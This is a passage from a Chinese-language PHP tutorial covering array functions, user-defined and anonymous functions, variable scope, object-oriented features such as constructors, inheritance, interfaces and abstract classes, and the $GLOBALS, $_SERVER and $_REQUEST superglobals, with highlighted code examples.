php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">sort</span>() - 对数组进行升序排列</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">rsort</span>() - 对数组进行降序排列</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">asort</span>() - 根据关联数组的值，对数组进行升序排列</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ksort</span>() - 根据关联数组的键，对数组进行升序排列</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">arsort</span>() - 根据关联数组的值，对数组进行降序排列</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">krsort</span>() - 根据关联数组的键，对数组进行降序排列</span><br></pre></td></tr></table></figure><p><strong>数组的操作</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组的合并</span></span><br><span class="line"><span class="variable">$array1</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$array2</span> = <span class="keyword">array</span>(<span class="string">&#x27;a1&#x27;</span>=&gt;<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;a2&#x27;</span>=&gt;<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;a3&#x27;</span>=&gt;<span class="string">&#x27;java&#x27;</span>);</span><br><span class="line"><span class="variable">$array3</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$array1</span>,<span class="variable">$array2</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填加数组元素</span></span><br><span class="line"><span class="comment">//array_push() 函数向第一个参数的数组尾部添加一个或多个元素（入栈），然后返回新数组的长度。</span></span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$array1</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//下表为空 自动添加参数</span></span><br><span class="line"><span class="variable">$array1</span>[]=<span class="string">&#x27;d&#x27;</span>;</span><br><span class="line"><span class="comment">//有键值的</span></span><br><span class="line"><span class="variable">$array1</span>[<span class="string">&#x27;a4&#x27;</span>]=<span class="string">&#x27;javasciprt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加到指定位置</span></span><br><span class="line"><span class="variable">$array1</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="variable">$array2</span> = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">array_splice</span>(<span class="variable">$array1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="variable">$array2</span>); <span class="comment">// 插入到位置3且删除0个</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//array_splice(数组，位置，删除几个，增加元素）</span></span><br><span class="line"><span class="comment">//删除某一个元素</span></span><br><span class="line"><span class="variable">$array1</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="variable">$array2</span> = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">array_splice</span>(<span class="variable">$array1</span>, <span class="number">3</span>, <span class="number">1</span>); </span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//unset 销毁指定的元素</span></span><br><span class="line"><span class="variable">$array1</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$array1</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//array_pop():将数组最后一个单元弹出（出栈）</span></span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$array1</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//修改数组中某个元素</span></span><br><span class="line"><span class="variable">$array1</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="variable">$array1</span>[<span class="number">0</span>]=<span class="string">&#x27;aa&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array1</span>);</span><br></pre></td></tr></table></figure><p>常用的数组函数</p><p><strong>is_array</strong> 判断是否为数组。</p><p><strong>count</strong> 数组的元素数目。</p><p><strong>array_search</strong>  在数组中搜索给定的值，如果成功则返回相应的键名。</p><p><strong>array_key_exists()</strong> 在给定的 key 存在于数组中时返回 TRUE。</p><p><strong>array_unshift()</strong>  将传入的单元插入到 array 数组的开头，注意单元是作为整体被插入的，因此传入单元将保持同样的顺序，所有的数值键名将修改为从零开始重新计数，所有的文字键名保持不变。</p><p><strong>array_shift()</strong>  将array 的第一个单元移出并作为结果返回，将 array 的长度减一并将所有其它单元向前移动一位，所有的数字键名将改为从零开始计数，文字键名将不变。</p><p><strong>array_unique()</strong>  接受 array 作为输入并返回没有重复值的新数组。注意键名保留不变。 array_unique()  先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名。这并不意味着在未排序的 array 中同一个值的第一个出现的键名会被保留。 </p><p><strong>in_array</strong> 检查数组中是否存在某个值  如果找到指定的值则返回 TRUE，否则返回 FALSE 。in_array()是区分大小写的。</p><h1 id="6-函数"><a href="#6-函数" class="headerlink" title="6 函数"></a>6 函数</h1><p>PHP 的真正力量来自它的函数：它拥有超过 1000 个内建的函数。</p><p>自定义函数 必须以function开头。</p><p>语法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span>(<span class="params">形参</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"> 被执行的代码;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">注释：函数名能够以字母或下划线开头（而非数字）。</span><br><span class="line"></span><br><span class="line">注释：函数名对大小写不敏感。</span><br></pre></td></tr></table></figure><p><strong>PHP 函数返回值</strong></p><p>如需使函数返回值，使用 return 语句：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$z</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 + 10 = &quot;</span> . <span class="title function_ invoke__">sum</span>(<span class="number">5</span>,<span class="number">10</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;7 + 13 = &quot;</span> . <span class="title function_ invoke__">sum</span>(<span class="number">7</span>,<span class="number">13</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2 + 4 = &quot;</span> . <span class="title function_ invoke__">sum</span>(<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>匿名函数</strong></p><p>匿名函数就是没有名字的函数。</p><p>将一个匿名函数”赋值”给一个变量——此时该变量就代表该匿名函数了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>(<span class="string">&#x27;Qeminco&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>回调函数</strong></p><p>回调函数是指调用函数的时候将另一个函数作为参数传递到调用的函数中，而不是传递一个普通的变量作为参数。</p><p>使用回调函数是为了可以将一段自己定义的功能传到函数内部使用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;get_name&#x27;</span>,<span class="string">&#x27;Qeminco&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="7-变量作用域"><a href="#7-变量作用域" class="headerlink" title="7 变量作用域"></a>7 变量作用域</h1><p>在 PHP 中，可以在脚本的任意位置对变量进行声明。</p><p>变量的作用域指的是变量能够被引用&#x2F;使用的那部分脚本。</p><p>PHP 有三种不同的变量作用域：</p><p>local（局部）</p><p>global（全局）</p><p>static（静态）</p><p>Local 和 Global 作用域</p><p>函数之外声明的变量拥有 Global 作用域，只能在函数以外进行访问。</p><p>函数内部声明的变量拥有 LOCAL 作用域，只能在函数内部进行访问。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span>=<span class="number">5</span>; <span class="comment">// 全局作用域</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$y</span>=<span class="number">10</span>; <span class="comment">// 局部作用域</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;测试函数内部的变量：&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;变量 x 是：<span class="subst">$x</span>&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;变量 y 是：<span class="subst">$y</span>&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;测试函数之外的变量：&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;变量 x 是：<span class="subst">$x</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;变量 y 是：<span class="subst">$y</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>注：可以在不同的函数中创建名称相同的局部变量，因为局部变量只能被在其中创建它的函数识别。</p><p><strong>global 关键词</strong></p><p>global 关键词用于在函数内访问全局变量。</p><p>要做到这一点，请在（函数内部）变量前面使用 global 关键词。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$x</span>,<span class="variable">$y</span>;</span><br><span class="line">  <span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>; <span class="comment">// 输出 15</span></span><br></pre></td></tr></table></figure><p><strong>static 关键词</strong></p><p>通常，当函数完成&#x2F;执行后，会删除所有变量。不过，有时我需要不删除某个局部变量。</p><p>要完成这一点，在首次声明变量时使用 static 关键词。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">static</span> <span class="variable">$x</span>=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">  <span class="variable">$x</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line">每当函数被调用时，这个变量所存储的信息都是函数最后一次被调用时所包含的信息。</span><br><span class="line">注：该变量仍然是函数的局部变量。</span><br></pre></td></tr></table></figure><h1 id="8-类与对象"><a href="#8-类与对象" class="headerlink" title="8 类与对象"></a>8 类与对象</h1><p>面向对象的程序设计（OOP）中，对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。</p><p>在现实世界里我们所面对的事情都是对象，如计算机、电视机、自行车等。</p><p>比如 Animal(动物) 是一个抽象类，我们可以具体到一只狗跟一只羊，而狗跟羊就是具体的对象，他们有颜色属性，可以写，可以跑等行为状态。</p><p><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</p><p><strong>对象</strong> − 是类的实例。</p><p><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</p><p><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</p><p><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</p><p><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</p><p><strong>多态</strong> − 多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</p><p><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</p><h2 id="8-1-类的定义"><a href="#8-1-类的定义" class="headerlink" title="8.1 类的定义"></a>8.1 类的定义</h2><p>使用class关键字后加上类名定义。</p><p>类的变量使用 var 来声明, 变量也可以初始化值。</p><p>类中定义的函数只能通过该类及其实例化的对象访问。</p><p>实例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="comment">//成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//类的实例化，p1就是一个对象</span></span><br><span class="line"><span class="comment">//this表示对象的本身</span></span><br><span class="line"><span class="variable">$p1</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$p1</span>-&gt;<span class="title function_ invoke__">setName</span>(<span class="string">&#x27;Qeminco&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p1</span>-&gt;name;</span><br></pre></td></tr></table></figure><h2 id="8-2-构造函数"><a href="#8-2-构造函数" class="headerlink" title="8.2 构造函数"></a>8.2 构造函数</h2><p>构造函数是一种特殊的方法，主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p><p>关键字：<code>__construct</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="comment">//成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">P</span>(<span class="string">&#x27;Qeminco&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p2</span>-&gt;name;</span><br></pre></td></tr></table></figure><h2 id="8-3-析构函数"><a href="#8-3-析构函数" class="headerlink" title="8.3 析构函数"></a>8.3 析构函数</h2><p>析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</p><p>关键字：<code>__destruct</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PP</span></span>&#123;</span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="comment">//成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PP</span>(<span class="string">&#x27;Qeminco&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="8-4-继承"><a href="#8-4-继承" class="headerlink" title="8.4 继承"></a>8.4 继承</h2><p>使用关键字 extends 来继承一个类，PHP 不支持多继承。</p><p>格式：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 子类 <span class="keyword">extends</span> 父类</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">setName</span>(); <span class="comment">//在子类函数中调用父类的同名方法,两个方法都会输出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;这是子类的setName()方法&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>方法重写</strong></p><p>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖，也称为方法的重写。</p><p>也就是说子类中有跟父类同名的函数，这个子类的实例调用这个函数时，只会调用子类中的函数。</p><p><strong>Final 关键字</strong></p><p>如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。</p><h2 id="8-5-访问控制"><a href="#8-5-访问控制" class="headerlink" title="8.5 访问控制"></a>8.5 访问控制</h2><p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public、protected或 private来实现的。</p><p><strong>public</strong>（公有）：公有的类成员可以在任何地方被访问。</p><p><strong>protected</strong>（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。</p><p><strong>private</strong>（私有）：私有的类成员则只能被其定义所在的类访问。</p><p>变量用 var 定义，被视为公有。方法没有使用这些关键字，默认为公有。</p><h2 id="8-6-接口"><a href="#8-6-接口" class="headerlink" title="8.6 接口"></a>8.6 接口</h2><p>使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。</p><p>接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。</p><p>接口中定义的所有方法都必须是公有，这是接口的特性。</p><p>要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="comment">//接口中 可以使用常量 但是不能使用变量</span></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">NAME</span>=<span class="string">&quot;这个是常量&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_name</span>(<span class="params"><span class="variable">$name</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">p1</span> <span class="keyword">implements</span> <span class="title">Person</span>,<span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_name</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-7-抽象类"><a href="#8-7-抽象类" class="headerlink" title="8.7 抽象类"></a>8.7 抽象类</h2><p>任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。</p><p>定义为抽象的类不能被实例化。</p><p>被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。</p><p>继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//声明抽象类 abstract</span></span><br><span class="line"><span class="comment">//抽象类中允许有 抽象方法和方法，抽象方法不能有具体的内容，必须为空，可以允许参数</span></span><br><span class="line"><span class="comment">//抽象类不能实例化</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">set_name</span>(<span class="params"><span class="variable">$name</span></span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;run&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//类只能继承一个抽象类</span></span><br><span class="line"><span class="comment">//必须把抽象类中的方法实现</span></span><br><span class="line"><span class="comment">//如果抽象类中的方法是受保护的，在子类定义中可以是protected，也可以是public，不能是私有的priva</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">p1</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_name</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;set_name&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-8Static关键字"><a href="#8-8Static关键字" class="headerlink" title="8.8Static关键字"></a>8.8Static关键字</h2><p>声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。</p><p>静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。</p><p>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。</p><p>静态属性不可以由对象通过 <code>-&gt;</code> 操作符来访问。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//静态方法 静态变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Person</span> <span class="keyword">as</span> <span class="title">GlobalPerson</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$name</span>=<span class="string">&quot;Qeminco&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;getString&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">Person</span>::<span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">Person</span>::<span class="title function_ invoke__">getString</span>();</span><br></pre></td></tr></table></figure><h1 id="9-PHP超级全局变量"><a href="#9-PHP超级全局变量" class="headerlink" title="9 PHP超级全局变量"></a>9 PHP超级全局变量</h1><p>**$GLOBALS ** ：一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="string">&quot;Qeminco&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$GLOBALS</span>); <span class="comment">//print_r() 函数用于打印变量，以更容易理解的形式展示。</span></span><br></pre></td></tr></table></figure><p><strong>$_SERVER</strong> ：一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> [<span class="variable">$k</span>]=&gt;<span class="variable">$value</span> &lt;/br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>$_REQUEST</strong> ：用于收集HTML表单提交的数据。它可以获取 cookie、 get 、post 。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span 